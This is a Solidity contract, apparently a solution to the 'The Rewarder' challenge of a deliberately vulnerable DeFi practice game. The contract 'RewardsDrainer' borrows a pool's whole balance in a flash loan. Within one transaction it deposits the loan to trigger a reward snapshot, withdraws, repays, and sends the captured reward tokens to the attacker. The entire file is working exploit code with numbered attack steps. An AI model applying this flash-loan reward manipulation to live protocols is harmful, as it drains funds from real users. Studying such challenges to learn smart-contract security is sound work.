// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract RewardsDrainer {
    FlashLoanerPool immutable loanPool;
    TheRewarderPool immutable rewardsPool;

    constructor(address _loanPool, address _rewardsPool) {
        loanPool = FlashLoanerPool(_loanPool);
        rewardsPool = TheRewarderPool(_rewardsPool);
    }

    function attack() external {
        IERC20 loanToken = loanPool.liquidityToken();
        uint256 amount = loanToken.balanceOf(address(loanPool));

        // 1. flash loan
        loanPool.flashLoan(amount);

        // 5. send rewards to attacker
        IERC20 rewardsToken = rewardsPool.rewardToken();
        uint256 rewardsAmount = rewardsToken.balanceOf(address(this));
        rewardsToken.transfer(msg.sender, rewardsAmount);
    }

    function receiveFlashLoan(uint256 amount) external {
        IERC20 loanToken = loanPool.liquidityToken();
        // 2. deposit (and distribute rewards)
        loanToken.approve(address(rewardsPool), amount);
        rewardsPool.deposit(amount);
        // 3. withdraw 
        rewardsPool.withdraw(amount);
        // 4. repay flash loan
        loanToken.transfer(address(loanPool), amount);
    }
}
